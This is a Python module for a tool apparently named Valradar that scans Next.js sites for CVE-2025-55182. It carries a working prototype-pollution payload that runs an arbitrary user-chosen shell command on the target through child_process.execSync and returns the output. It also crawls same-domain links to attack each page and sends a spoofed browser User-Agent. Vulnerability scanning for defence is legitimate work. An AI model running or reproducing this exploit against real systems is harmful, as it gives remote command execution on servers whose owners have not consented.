"""CVE-2025-55182 scanner - checks Next.js applications for prototype pollution vulnerability."""

# Based on https://github.com/msanft/CVE-2025-55182/blob/main/poc.py

import json
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup

from valradar.sdk import Module, Option, Result, Task


def check_vulnerability(url: str, executable: str = "id") -> tuple[bool, dict]:
    """
    Check if a URL is vulnerable to CVE-2025-55182.

    Returns:
        Tuple of (is_vulnerable, response_info)
    """
    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            "_prefix": f"var res = process.mainModule.require('child_process').execSync('{executable}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }

    files = {
        "0": (None, json.dumps(crafted_chunk)),
        "1": (None, '"$@0"'),
    }

    headers = {"Next-Action": "x"}

    try:
        response = requests.post(url, files=files, headers=headers, timeout=10)
        is_vulnerable = response.status_code == 500 and "$@1" in response.text
        return is_vulnerable, {
            "status_code": str(response.status_code),
            "vulnerable": str(is_vulnerable),
        }
    except requests.RequestException:
        return False, {}


class CVE2025_55182Scanner(Module):
    """Scans Next.js applications for CVE-2025-55182 prototype pollution vulnerability."""

    name = "CVE-2025-55182"
    description = "Check Next.js applications for prototype pollution vulnerability"
    author = "Valradar"
    version = "0.1.0"
    options = [
        Option("url", type="str", required=True, help="Target URL to scan"),
        Option("executable", type="str", default="id", help="Command to test (default: id)"),
    ]

    def setup(self):
        """Initialize the HTTP session."""
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/120.0.0.0 Safari/537.36"
        })
        self.executable = "id"

    def run(self, target: str, **kwargs):
        """
        Scan a URL for CVE-2025-55182 vulnerability.

        Args:
            target: URL to scan
            **kwargs: May contain 'executable' command to test

        Yields:
            Result: Vulnerability check results
            Task: For each link found on the page
        """
        executable = kwargs.get('executable', self.executable)

        # Normalize URL
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target

        # First, try to fetch the page content for link extraction
        try:
            response = self.session.get(target, timeout=10)
        except requests.RequestException:
            response = None

        # Check for vulnerability
        is_vulnerable, info = check_vulnerability(target, executable)

        # Always yield a result with vulnerability status
        yield Result(
            host=target[:60],
            data={
                "vulnerable": str(is_vulnerable),
                "status": info.get("status_code", "error"),
                "executable": executable,
            }
        )

        # Extract and yield links for crawling (only if we got the page)
        if response is not None:
            base_domain = urlparse(target).netloc
            soup = BeautifulSoup(response.text, "html.parser")

            for link in soup.find_all("a", href=True):
                href = link["href"]

                if not href or href.startswith(('#', 'javascript:', 'mailto:', 'tel:')):
                    continue

                full_url = urljoin(target, href)
                link_domain = urlparse(full_url).netloc

                if link_domain == base_domain:
                    yield Task(target=full_url, kwargs={'executable': executable})


# Export for Rust loader
MODULE_CLASS = CVE2025_55182Scanner
